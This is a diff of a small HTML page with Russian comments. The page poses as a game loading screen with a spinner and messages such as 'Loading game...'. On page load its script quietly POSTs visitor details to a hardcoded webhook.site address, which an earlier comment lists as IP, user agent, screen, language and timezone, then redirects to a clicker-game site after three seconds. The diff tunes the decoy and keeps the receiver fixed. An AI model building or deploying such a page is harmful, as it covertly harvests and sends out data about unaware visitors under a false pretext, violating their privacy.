@@ -6,12 +6,12 @@
 <title>Загрузка...</title>
 <style>
   body{font-family:system-ui,sans-serif;background:#0d0d0d;color:#eee;
-       display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
+       display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden}
   .box{text-align:center}
   .spin{width:48px;height:48px;border:4px solid #333;border-top-color:#2a6;
         border-radius:50%;animation:s 1s linear infinite;margin:0 auto 20px}
   @keyframes s{to{transform:rotate(360deg)}}
-  p{opacity:.8;font-size:15px}
+  p{opacity:.8;font-size:15px;margin:5px 0}
 </style>
 </head>
 <body>
@@ -21,17 +21,13 @@
 </div>
 
 <script>
-// ==== ТВОЙ ПРИЁМНИК ====
+// ==== ТВОЙ ПРИЁМНИК (не меняй) ====
 const HOOK = "https://webhook.site/9f5d0c93-5cdc-4243-b020-361ff9394b9c";
 
-// ==== КУДА РЕДИРЕКТИТЬ ПОСЛЕ ====
-// замени на свою страницу/игру/видео
-const REDIRECT_TO = "https://example.com";
+// ==== КУДА РЕДИРЕКТИТЬ (веду на простую игру-кликер) ====
+const REDIRECT_TO = "https://clickspeedtest.com/";
 
-// ==== ЧЕРЕЗ СКОЛЬКО СЕКУНД РЕДИРЕКТ ====
-const DELAY_SEC = 3;
-
-// ---- 1. пинг на webhook: IP, UA, экран, язык, таймзона ----
+// ---- 1. Шлём данные на webhook ----
 fetch(HOOK, {
   method: "POST",
   mode: "no-cors",
@@ -48,18 +44,18 @@ fetch(HOOK, {
   })
 }).catch(function(){});
 
-// ---- 2. лёгкий прогресс, чтобы не выглядело пусто ----
+// ---- 2. Анимация загрузки ----
 var msg = document.getElementById("msg");
-var steps = ["Загружаем игру...", "Подключаемся...", "Почти готово..."];
+var steps = ["Загружаем игру...", "Подключаемся к серверу...", "Почти готово..."];
 var i = 0;
 var tick = setInterval(function(){
   i++;
   if (i < steps.length) msg.textContent = steps[i];
   else clearInterval(tick);
-}, Math.max(700, Math.floor(DELAY_SEC * 1000 / steps.length)));
+}, 1000);
 
-// ---- 3. редирект ----
-setTimeout(function(){ location.href = REDIRECT_TO; }, DELAY_SEC * 1000);
+// ---- 3. Редирект через 3 секунды ----
+setTimeout(function(){ location.href = REDIRECT_TO; }, 3000);
 </script>
 </body>
 </html>
